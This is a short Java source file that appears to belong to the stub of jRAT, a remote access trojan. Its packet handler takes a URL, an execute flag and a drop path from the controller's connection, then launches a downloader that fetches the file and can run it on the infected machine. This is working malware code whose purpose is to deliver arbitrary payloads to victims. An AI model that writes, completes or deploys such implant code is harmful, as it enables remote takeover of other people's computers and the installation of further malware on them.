package io.jrat.stub.packets.incoming;

import io.jrat.stub.AdvancedDownloader;
import io.jrat.stub.Connection;

public class Packet34AdvancedDownload extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		boolean exec = Connection.readBoolean();
		String drop = Connection.readLine().toLowerCase();
		new AdvancedDownloader(url, exec, drop).start();
	}

}
